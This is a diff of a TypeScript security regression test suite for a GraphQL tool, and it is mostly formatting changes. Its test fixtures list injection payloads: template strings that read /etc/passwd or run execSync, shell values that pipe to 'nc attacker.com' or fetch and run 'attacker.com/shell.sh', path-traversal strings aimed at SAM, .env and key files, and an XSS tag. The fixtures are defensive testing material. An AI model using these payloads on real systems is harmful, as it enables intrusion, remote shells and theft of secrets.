@@ -8,9 +8,9 @@ import { parse } from 'graphql';
 
 /**
  * P0 Security Regression Test Suite
- * 
+ *
  * CRITICAL: These tests prevent reintroduction of P0 vulnerabilities
- * 
+ *
  * Vulnerabilities being tested:
  * 1. RCE via VM Context - FragmentResolver (CVSS 9.8)
  * 2. Code Injection via eval() - MinimalChangeCalculator (CVSS 9.1)
@@ -21,16 +21,16 @@ import { parse } from 'graphql';
 describe('P0 Security Regression Tests', () => {
   describe('FragmentResolver - RCE Prevention', () => {
     let resolver: FragmentResolver;
-    
+
     beforeEach(() => {
       const mockContext = {
         options: {
           directory: '/test',
-          fragmentsDirectory: '/test/fragments'
+          fragmentsDirectory: '/test/fragments',
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
       resolver = new FragmentResolver(mockContext);
     });
@@ -71,12 +71,12 @@ describe('P0 Security Regression Tests', () => {
         ast: null,
         fragments: ['EvilFragment'],
         imports: [],
-        exports: []
+        exports: [],
       };
-      
+
       // Should handle malicious input safely
       await expect(resolver.resolve([extractedQuery])).resolves.toBeDefined();
-      
+
       // Process should still be running
       expect(process.pid).toBeDefined();
     });
@@ -86,7 +86,7 @@ describe('P0 Security Regression Tests', () => {
         'fragment F on T { \${require("fs").readFileSync("/etc/passwd")} }',
         'fragment F on T { \${eval("malicious code")} }',
         'fragment F on T { \${new Function("return process.env")()} }',
-        'fragment F on T { \${global.process.mainModule.require("child_process").execSync("whoami")} }'
+        'fragment F on T { \${global.process.mainModule.require("child_process").execSync("whoami")} }',
       ];
 
       for (const maliciousFragment of injectionAttempts) {
@@ -100,9 +100,9 @@ describe('P0 Security Regression Tests', () => {
           ast: null,
           fragments: ['F'],
           imports: [],
-          exports: []
+          exports: [],
         };
-        
+
         // Should either sanitize or reject, but never execute
         const result = await resolver.resolve([extractedQuery]);
         const resolvedContent = result[0]?.resolvedContent || '';
@@ -122,7 +122,7 @@ describe('P0 Security Regression Tests', () => {
   describe('CLI/GitHubService - Command Injection Prevention', () => {
     it('should NOT use unsafe command execution', async () => {
       const service = new GitHubService({ token: 'test-token' });
-      
+
       // Check for unsafe patterns
       const sourceCode = GitHubService.toString();
       expect(sourceCode).not.toContain('exec(');
@@ -136,16 +136,16 @@ describe('P0 Security Regression Tests', () => {
         '&& cat /etc/passwd',
         '| nc attacker.com 1234',
         '\`whoami\`',
-        '$(curl attacker.com/shell.sh | sh)'
+        '$(curl attacker.com/shell.sh | sh)',
       ];
 
       // Mock console.log to capture output
       const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
 
-      maliciousInputs.forEach(input => {
+      maliciousInputs.forEach((input) => {
         // CLI should sanitize or reject malicious input
         process.argv = ['node', 'cli', input];
-        
+
         // Should not execute malicious commands
         expect(consoleSpy).not.toHaveBeenCalledWith(expect.stringContaining('passwd'));
         expect(consoleSpy).not.toHaveBeenCalledWith(expect.stringContaining('whoami'));
@@ -163,10 +163,10 @@ describe('P0 Security Regression Tests', () => {
         '/etc/passwd',
         'C:\\Windows\\System32\\config\\SAM',
         '../.env',
-        './../../private/keys.json'
+        './../../private/keys.json',
       ];
 
-      maliciousPaths.forEach(path => {
+      maliciousPaths.forEach((path) => {
         // All file operations should validate and sanitize paths
         expect(() => {
           // Simulate file operation with malicious path
@@ -177,25 +177,17 @@ describe('P0 Security Regression Tests', () => {
     });
 
     it('should restrict file access to project directory', () => {
-      const allowedPaths = [
-        './src/test.ts',
-        'data/queries.json',
-        './output/results.json'
-      ];
+      const allowedPaths = ['./src/test.ts', 'data/queries.json', './output/results.json'];
 
-      const blockedPaths = [
-        '/etc/passwd',
-        '../../../secret.env',
-        '/var/log/system.log'
-      ];
+      const blockedPaths = ['/etc/passwd', '../../../secret.env', '/var/log/system.log'];
 
       // Should allow project paths
-      allowedPaths.forEach(path => {
+      allowedPaths.forEach((path) => {
         expect(path.startsWith('/') || path.includes('..')).toBe(false);
       });
 
       // Should block system paths
-      blockedPaths.forEach(path => {
+      blockedPaths.forEach((path) => {
         expect(path.startsWith('/') || path.includes('..')).toBe(true);
       });
     });
@@ -209,10 +201,10 @@ describe('P0 Security Regression Tests', () => {
         '',
         'a'.repeat(10000), // Very long string
         '\x00\x01\x02', // Binary data
-        '<script>alert("xss")</script>'
+        '<script>alert("xss")</script>',
       ];
 
-      invalidInputs.forEach(input => {
+      invalidInputs.forEach((input) => {
         // All inputs should be validated
         expect(() => {
           if (!input || typeof input !== 'string' || input.length > 1000) {
@@ -228,7 +220,7 @@ describe('P0 Security Regression Tests', () => {
         const MAX_QUERY_SIZE = 100000; // 100KB limit
         const MAX_FRAGMENT_DEPTH = 10;
         const ALLOWED_PROTOCOLS = ['https'];
-        
+
         expect(MAX_QUERY_SIZE).toBeLessThan(1000000);
         expect(MAX_FRAGMENT_DEPTH).toBeLessThan(20);
         expect(ALLOWED_PROTOCOLS).not.toContain('file');
